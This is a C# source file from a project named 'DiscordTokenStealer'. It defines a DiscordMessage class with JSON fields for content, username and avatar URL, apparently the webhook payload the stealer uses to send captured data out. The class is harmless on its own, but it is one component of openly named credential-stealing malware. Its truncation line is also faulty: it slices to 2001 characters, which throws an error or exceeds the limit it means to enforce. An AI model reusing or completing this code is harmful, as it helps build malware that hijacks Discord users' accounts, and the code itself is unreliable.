using System.Text.Json.Serialization;

namespace DiscordTokenStealer.Discord;

public class DiscordMessage
{
    public DiscordMessage(string content, string? username = null, string? avatarUrl = null)
    {
        Content = content.Length >= 2000 ? content[..2001] : content;
        Username = username;
        AvatarUrl = avatarUrl;
    }

    [JsonPropertyName("content")] [JsonInclude] public string Content { get; private set; }
    [JsonPropertyName("username")] [JsonInclude] [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)] public string? Username { get; private set; }
    [JsonPropertyName("avatar_url")] [JsonInclude] [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)] public string? AvatarUrl { get; private set; }
}